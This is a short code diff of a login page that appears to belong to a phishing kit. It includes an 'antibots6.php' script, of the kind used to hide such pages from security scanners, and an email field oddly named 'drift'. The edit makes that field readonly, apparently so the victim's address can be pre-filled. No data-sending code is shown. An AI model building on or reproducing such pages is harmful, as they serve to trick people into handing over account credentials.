@@ -54,7 +54,7 @@ include('antibots6.php');
           
           <div class="col-xs-24 mb-15">
 		  
-		  <input placeholder="Email Address" type="email" name="drift" tabindex="1" style="background-color: rgba(255, 255, 255, 0.55); border: 1px solid rgba(255, 255, 255, 0.55); box-shadow: 0 3px 4px 0 rgba(0, 0, 0, 0.16);" id="email" value=""   required="" >
+		  <input placeholder="Email Address" type="email" readonly="readonly" name="drift" tabindex="1" style="background-color: rgba(255, 255, 255, 0.55); border: 1px solid rgba(255, 255, 255, 0.55); box-shadow: 0 3px 4px 0 rgba(0, 0, 0, 0.16);" id="email" value=""   required="" >
 		  
           </div>
           <div class="col-xs-24 mb-5"><div id="loginForm:password-field" class="login-button-combo col-xs-24" style="background-color: rgba(255, 255, 255, 0.55); border: 1px solid rgba(255, 255, 255, 0.55); box-shadow: 0 3px 4px 0 rgba(0, 0, 0, 0.16);">
